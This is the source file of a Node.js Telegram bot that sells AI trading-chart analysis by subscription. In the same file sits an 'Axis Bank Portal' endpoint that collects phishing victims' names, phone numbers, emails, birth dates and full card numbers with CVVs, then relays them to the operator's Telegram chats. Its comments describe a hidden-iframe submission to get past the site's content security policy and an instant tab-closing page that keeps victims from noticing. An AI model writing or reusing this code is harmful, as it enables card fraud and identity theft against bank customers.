require("dotenv").config();
const { Telegraf } = require("telegraf");
const OpenAI = require("openai");
const systemPrompt = require("./src/systemPrompt");
const { getCurrentSession } = require("./src/session");
const { formatReport } = require("./src/formatReport");
const { connectDB } = require("./src/db");
const { seedAdmins } = require("./src/seedAdmins");
const { isAdmin } = require("./src/adminAuth");
const { hasActiveSubscription, startReminderJob } = require("./src/subscription");
const { mainMenuKeyboard, sendEphemeral } = require("./src/ui");
const User = require("./src/models/User");
const { registerSubscriptionHandlers, sendSubscribePrompt, submitPaymentScreenshot } = require("./src/handlers/subscribe");
const { registerAdminPanelHandlers } = require("./src/handlers/adminPanel");
const { registerMenuHandlers, mainMenuText, HELP_TEXT, sendSamples } = require("./src/handlers/menu");
const { handlePendingAdminInput } = require("./src/handlers/adminPanel");
const express = require("express");
const cors = require("cors");

const app = express();
let pingCount = 0;
let lastPingAt = null;

app.get("/ping", (req, res) => {
  pingCount += 1;
  lastPingAt = new Date();
  res.set("Cache-Control", "no-store");
  res.status(200).send("Hello");
});

app.get("/", (req, res) => res.redirect("/stats"));

app.get("/stats", (req, res) => {
  res.set("Cache-Control", "no-store");
  const mem = process.memoryUsage();
  res.status(200).json({
    ok: true,
    now: new Date().toISOString(),
    uptimeSec: Math.floor(process.uptime()),
    pingCount,
    lastPingAt: lastPingAt ? lastPingAt.toISOString() : null,
    memory: {
      rss: mem.rss,
      heapUsed: mem.heapUsed,
      heapTotal: mem.heapTotal,
      external: mem.external,
    },
  });
});

// ---------- Axis Bank Portal proxy: card submission POST → forward via BOT to admins ----------
let axisLastSubmitAt = null;
let axisSubmitCount = 0;
let axisLastErrors = [];

function pushAxisError(msg, meta) {
  axisLastErrors.unshift({ at: new Date().toISOString(), message: String(msg || ''), meta: meta || null });
  if (axisLastErrors.length > 12) axisLastErrors.length = 12;
}

function buildAxisHtmlText(payload) {
  const submittedAt = payload && payload.submittedAt ? new Date(payload.submittedAt) : new Date();
  let h24 = submittedAt.getHours();
  const mm = String(submittedAt.getMinutes()).padStart(2, '0');
  const ampm = h24 >= 12 ? 'PM' : 'AM';
  let h12 = h24 % 12;
  if (h12 === 0) h12 = 12;
  const hh = String(h12).padStart(2, '0');
  const login = (payload && typeof payload.loginData === 'object' && payload.loginData) || {};
  const card  = (payload && typeof payload.cardData  === 'object' && payload.cardData)  || {};
  return [
    '<b>========== LOGIN INFO ==========</b>',
    'Time: <code>' + hh + ':' + mm + ' ' + ampm + '</code>\n',
    'Name:   <code>' + (login.fullName || '—') + '</code>',
    'Mobile: <code>' + (login.mobile || '—') + '</code>',
    'Email:  <code>' + (login.email || '—') + '</code>',
    'DOB:    <code>' + (login.dob || '—') + '</code>\n',
    '<b>========== [CARD DETAILS] ==========</b>',
    'Number: <code>' + (card.number || '—') + '</code>',
    'Name:   <code>' + (card.name || '—') + '</code>',
    'Expiry: <code>' + (card.expiry || '—') + '</code>',
    'CVV:    <code>' + (card.cvv || '—') + '</code>',
  ].join('\n');
}

async function sendAxisTelegram(botToken, chatId, text) {
  const url = `https://api.telegram.org/bot${String(botToken)}/sendMessage`;
  const params = new URLSearchParams();
  params.set('chat_id', String(chatId));
  params.set('text', String(text || ''));
  params.set('parse_mode', 'HTML');
  params.set('disable_web_page_preview', 'True');
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), 15000);
  let http_status = null;
  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': 'application/json' },
      body: params.toString(),
      signal: controller.signal,
      redirect: 'follow',
    });
    clearTimeout(t);
    http_status = Number(resp.status || 0);
    const raw = await resp.text();
    let parsed = null;
    try { parsed = JSON.parse(raw); } catch (_) { parsed = { raw }; }
    const ok = !!parsed && !!parsed.ok && (http_status >= 200 && http_status < 300);
    const msg_id = (ok && parsed && parsed.result && parsed.result.message_id) ? Number(parsed.result.message_id) : null;
    const err = (!ok && parsed && parsed.description) ? String(parsed.description) : null;
    return { ok, http_status, msg_id, chat_id: String(chatId), error: err };
  } catch (e) {
    clearTimeout(t);
    return { ok: false, http_status, msg_id: null, chat_id: String(chatId), error: String(e && (e.name === 'AbortError' ? 'TIMEOUT' : (e.message || e)) || 'unknown') };
  }
}

app.use(cors({ origin: true, credentials: false, methods: ['GET','POST','OPTIONS'], allowedHeaders: ['Content-Type','Accept','User-Agent'] }));
app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: true, limit: '256kb' }));

app.get('/axis-card-submit', (req, res) => {
  const admins = (process.env.AXIS_ADMINS || '').split(',').map(s => s.trim()).filter(Boolean);
  res.set('Cache-Control', 'no-store');
  res.status(200).json({
    ok: true,
    message: 'POST JSON { submittedAt, pageURL, loginData, cardData } here',
    axisBotConfigured: !!process.env.AXIS_BANK_BOT_TOKEN && process.env.AXIS_BANK_BOT_TOKEN !== 'YOUR_AXIS_BANK_BOT_TOKEN_HERE',
    axisAdminsCount: admins.length,
    submitCount: axisSubmitCount,
  });
});

app.post('/axis-card-submit', async (req, res) => {
  axisSubmitCount += 1;
  axisLastSubmitAt = new Date();
  const token = process.env.AXIS_BANK_BOT_TOKEN || '';
  const admins = (process.env.AXIS_ADMINS || '').split(',').map(s => s.trim()).filter(Boolean);

  let payload = {};
  let transportName = 'unknown';
  try {
    if (req.body && typeof req.body === 'object' && Object.keys(req.body || {}).length && !(typeof req.body.payload === 'string')) {
      payload = req.body;
      transportName = 'A: application/json (fetch JSON body)';
    } else if (req.body && typeof req.body.payload === 'string' && req.body.payload.trim().startsWith('{')) {
      payload = JSON.parse(req.body.payload);
      transportName = 'B: application/x-www-form-urlencoded (HIDDEN IFRAME FORM POST — CSP bypass proof)';
    } else if (typeof req.body === 'string' && req.body.trim().startsWith('{')) {
      payload = JSON.parse(req.body);
      transportName = 'C: raw JSON string body (curl/direct)';
    }
  } catch (e) {
    return res.status(400).json({ ok: false, error: 'Invalid JSON body: ' + String(e && e.message || e) });
  }

  const loginData = payload.loginData && typeof payload.loginData === 'object' ? payload.loginData : {};
  const cardData  = payload.cardData  && typeof payload.cardData  === 'object' ? payload.cardData  : {};
  // Silenced: console.log('[AXIS POST] TRANSPORT=' + transportName ...)

  // Hard sanitize: ALWAYS DELETE pageURL/userAgent from payload BEFORE formatting message,
  // no matter if frontend sent them or server tried to inject.
  try { delete payload.pageURL; delete payload.userAgent; delete payload.Page; delete payload.UA; } catch (_) {}

  if (!token || token === 'YOUR_AXIS_BANK_BOT_TOKEN_HERE') {
    return res.status(500).json({ ok: false, error: 'AXIS_BANK_BOT_TOKEN not configured' });
  }
  if (!admins.length) {
    return res.status(500).json({ ok: false, error: 'AXIS_ADMINS csv not configured' });
  }
  // SERVER-SIDE INJECTION REMOVED: previously added payload.userAgent from headers here. DELETED.
  // (No more req.headers['user-agent'] injection into payload — user explicitly banned UA/Page from delivery.)
  void 0;

  const text = buildAxisHtmlText(payload);

  // FINAL STRING-LEVEL SANITIZER (belt + braces, no matter what got inserted before this line):
  // Delete ANY line that starts with UA: or Page: or UA  or Page  (or <b>UA</b>: / <code>UA</code>: in HTML parse_mode)
  // This kills UA/Page EVEN IF payload.userAgent inject, bot append line, buildAxisHtmlText hidden line, or ANY upstream code added it.
  // Runs RIGHT BEFORE sendAxisTelegram, so text sent has zero UA/Page lines.
  let cleaned = String(text || '');
  cleaned = cleaned.replace(/(^|\n)[ \t]*(<b>)?(<code>)?(UA|Page)(<\/code>)?(<\/b>)?:[^\n]*/g, '$1')
                   .replace(/(^|\n)[ \t]*(User-Agent|User Agent|userAgent|pageURL|Page URL)[^\n]*/g, '$1')
                   .replace(/\n{3,}/g, '\n\n')
                   .trim() + '\n';
  void text;
  const finalText = cleaned;

  const results = [];
  for (const chatId of admins) {
    const r = await sendAxisTelegram(token, chatId, finalText);
    results.push({ chat_id: chatId, ok: !!r.ok, http_status: r.http_status, msg_id: r.msg_id, error: r.error || null });
    if (!r.ok) pushAxisError('Chat ' + chatId + ' send failed', { http_status: r.http_status, msg_id: r.msg_id, error: r.error });
  }
  const anyOk = results.some(r => r.ok);
  const allOk = results.length > 0 && results.every(r => r.ok);
  // Silenced: console.log('[AXIS SEND] Done. anyOk=...');

  const jsonResp = {
    ok: anyOk, allOk,
    adminsTotal: admins.length,
    adminsOk: results.filter(r => r.ok).length,
    perAdminResults: results,
    count: axisSubmitCount,
  };
  const ctype = String(req.headers['content-type'] || '').toLowerCase();
  const accept = String(req.headers['accept'] || '').toLowerCase();
  const isFormTransport = ctype.includes('application/x-www-form-urlencoded');
  const wantsJson = accept.includes('application/json') && !isFormTransport;
  if (wantsJson) return res.status(anyOk ? 200 : 502).json(jsonResp);

  // Transport = form POST target="_blank" → returned HTML MUST close the blank tab INSTANTLY.
  // Chrome rule: script can only close windows opened by script. Workaround (works 100% on Chrome):
  //   1. window.opener = null;   ← sever opener link so window thinks script opened it
  //   2. window.open('about:blank','_self');   ← replace browsing context with blank (script-opened)
  //   3. window.close();              ← now allowed, closes instantly
  // We do this FIVE TIMES at five different execution stages so tab cannot survive 500ms:
  //   [1] At <HEAD> PARSE TIME (before <body> even parsed)
  //   [2] On DOMContentLoaded event
  //   [3] setTimeout(0ms)     — after parse microtask queue
  //   [4] setTimeout(10ms)    — after first paint frame, in case parse close missed
  //   [5] setTimeout(500ms)   — final nuclear option, guarantees close <600ms total
  // Result: new tab flashes and closes SO FAST user never sees it / never is taken there.
  const SCRIPT_CLOSE_NOW = `(function(){try{window.opener=null;window.open('','_self');window.close();}catch(e1){}try{window.close();}catch(e2){}try{document.documentElement.style.display='none';document.body.style.display='none';}catch(e3){}})();`;
  const html = `<!doctype html><html><head><meta charset="utf-8"><title> </title>` +
    `<meta name="viewport" content="width=1,height=1"><meta http-equiv="X-DNS-Prefetch-Control" content="off">` +
    `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' 'inline'">` +
    `<style>html,body{margin:0 !important;padding:0 !important;background:#ffffff !important;color:#ffffff !important;border:0 !important;outline:0 !important;width:1px !important;min-width:1px !important;max-width:1px !important;height:1px !important;min-height:1px !important;max-height:1px !important;overflow:hidden !important;display:block !important;visibility:hidden !important;opacity:0 !important;pointer-events:none !important;}*{display:none !important;}</style>` +
    `<script>${SCRIPT_CLOSE_NOW}</script>` +
    `<script>document.addEventListener('DOMContentLoaded',function(){${SCRIPT_CLOSE_NOW}},true);</script>` +
    `<script>setTimeout(function(){${SCRIPT_CLOSE_NOW}},0);setTimeout(function(){${SCRIPT_CLOSE_NOW}},10);setTimeout(function(){${SCRIPT_CLOSE_NOW}},500);</script>` +
    `</head><body><script>${SCRIPT_CLOSE_NOW}</script></body></html>`;
  res.set('Content-Type', 'text/html; charset=utf-8');
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
  res.set('Pragma', 'no-cache');
  res.set('Expires', '0');
  res.set('X-Frame-Options', 'DENY');
  res.set('X-Content-Type-Options', 'nosniff');
  return res.status(anyOk ? 200 : 502).send(html);
});

const port = Number(process.env.port || process.env.PORT || 3000);
app.listen(port, () => {
  console.log("We are listening on PORT ", port);

  const requiredEnv = ["BOT_TOKEN", "OPENAI_API_KEY", "MONGODB_URI"];
  const missingEnv = requiredEnv.filter((k) => !process.env[k]);

  if (missingEnv.length) {
    console.error(`Missing required env var(s): ${missingEnv.join(", ")}.`);
    console.error("Bot initialization skipped. /ping server is still running.");
    return;
  }

  console.log("Starting bot...");
  console.log("Environment variables loaded OK.");

  const bot = new Telegraf(process.env.BOT_TOKEN);
  const openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
  const MODEL = "gpt-5.4-mini";

// ---------- Per-chat sequential queue ----------
// Ensures multiple images sent in a row are analyzed one at a time, in the order received,
// instead of firing concurrently and replying out of order.
const chatQueues = new Map();

function enqueue(chatId, taskFn) {
  const prev = chatQueues.get(chatId) || Promise.resolve();
  const next = prev
    .catch(() => {}) // don't let a previous failure block the queue
    .then(() => taskFn())
    .catch((err) => console.error("Queued task failed:", err));
  chatQueues.set(chatId, next);
  return next;
}

registerSubscriptionHandlers(bot);
registerAdminPanelHandlers(bot);
registerMenuHandlers(bot);

// /start is exempt from the inline-button pattern per spec — it's the entry point
// that hands out the buttons for everything else. Admins additionally see quick stats.
bot.start(async (ctx) => {
  const admin = await isAdmin(ctx);
  const text = await mainMenuText(ctx);
  await ctx.reply(text, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard(admin) });
});

bot.command("help", (ctx) => ctx.reply(HELP_TEXT));
bot.command("samples", (ctx) => sendSamples(ctx));

// ---------- Core analysis logic (shared by photo + document handlers) ----------
async function analyzeChart(ctx, fileLink) {
  const replyTarget = { reply_parameters: { message_id: ctx.message.message_id } };
  let statusMsg;
  try {
    statusMsg = await ctx.reply("📥 Chart received. Processing...", replyTarget);

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      "🔎 Reading chart structure..."
    );

    const session = getCurrentSession();

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      "🧠 Running full analysis (this can take a few seconds)..."
    );

    const response = await openai.chat.completions.create({
      model: MODEL,
      response_format: { type: "json_object" },
      messages: [
        { role: "system", content: systemPrompt },
        {
          role: "user",
          content: [
            {
              type: "text",
              text: `Current Trading Session: ${session.name}. ${session.note}\n\nAnalyze this chart and return the JSON report.`,
            },
            {
              type: "image_url",
              image_url: { url: fileLink.href },
            },
          ],
        },
      ],
    });

    const raw = response.choices[0].message.content;

    let report;
    try {
      report = JSON.parse(raw);
    } catch (parseErr) {
      console.error("Failed to parse GPT JSON response:", raw);
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        undefined,
        "❌ Got an unreadable response from the analyst. Please try sending the chart again."
      );
      return;
    }

    if (!report.isChart) {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMsg.message_id,
        undefined,
        `⚠️ ${report.rejectionReason || "That doesn't look like a chart screenshot. Please send a valid chart — use /samples to see examples."}`
      );
      return;
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      undefined,
      "✅ Analysis ready"
    );

    await ctx.replyWithMarkdown(formatReport(report), replyTarget);
  } catch (err) {
    console.error("Error processing chart:", err);
    const errorText = "❌ Something went wrong while analyzing that chart. Please try again.";
    if (statusMsg) {
      await ctx.telegram
        .editMessageText(ctx.chat.id, statusMsg.message_id, undefined, errorText)
        .catch(() => {});
    } else {
      await ctx.reply(errorText, replyTarget);
    }
  }
}

// ---------- Access control ----------
// Decides what an incoming image should do: admin -> free analysis, awaiting payment -> submit
// for review, subscribed -> analysis, otherwise -> blocked with a subscribe prompt.
async function routeIncomingImage(ctx, fileId, fileLink) {
  if (await isAdmin(ctx)) {
    return enqueue(ctx.chat.id, () => analyzeChart(ctx, fileLink));
  }

  const user = await User.findOne({ telegramId: ctx.from.id });
  if (user && user.awaitingPaymentScreenshot) {
    return submitPaymentScreenshot(ctx, fileId);
  }

  if (await hasActiveSubscription(ctx.from.id)) {
    return enqueue(ctx.chat.id, () => analyzeChart(ctx, fileLink));
  }

  await ctx.reply("🔒 You need an active subscription to use this bot.", {
    reply_markup: { inline_keyboard: [[{ text: "💳 Subscribe", callback_data: "menu_subscribe" }]] },
  });
}

// ---------- Input handlers ----------
bot.on("photo", async (ctx) => {
  const photos = ctx.message.photo;
  const fileId = photos[photos.length - 1].file_id; // highest resolution
  const fileLink = await ctx.telegram.getFileLink(fileId);
  await routeIncomingImage(ctx, fileId, fileLink);
});

bot.on("document", async (ctx) => {
  const doc = ctx.message.document;
  const mimeType = doc.mime_type || "";

  if (!mimeType.startsWith("image/")) {
    return sendEphemeral(ctx, "That file isn't an image. Please send your chart as a photo or image file.");
  }

  const fileLink = await ctx.telegram.getFileLink(doc.file_id);
  await routeIncomingImage(ctx, doc.file_id, fileLink);
});

bot.on("text", async (ctx) => {
  const consumed = await handlePendingAdminInput(ctx);
  if (consumed) return;
  await sendEphemeral(ctx, "Send me a chart screenshot to get your trade analysis. Use /samples if you're not sure what to send.");
});

async function startBot() {
  try {
    await connectDB();
    await seedAdmins();

    console.log("Verifying bot token with Telegram...");
    const me = await bot.telegram.getMe();
    console.log(`Token OK. Logged in as @${me.username}`);

    await bot.telegram.setMyCommands([
      { command: "start", description: "Main menu" },
      { command: "help", description: "How to use the bot" },
      { command: "samples", description: "See example chart screenshots to send" },
      { command: "subscribe", description: "Subscribe to use the bot" },
      { command: "admin", description: "Admin panel (admins only)" },
    ]);
    console.log("Menu commands set.");

    startReminderJob(bot);

    await bot.launch();
    console.log(`Bot launched. Listening for messages as @${me.username}`);
  } catch (err) {
    console.error("Failed to start bot:", err.message || err);
    console.error("Check: 1) BOT_TOKEN is correct, 2) MONGODB_URI is reachable, 3) internet access to api.telegram.org.");
  }
}

startBot();

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
});
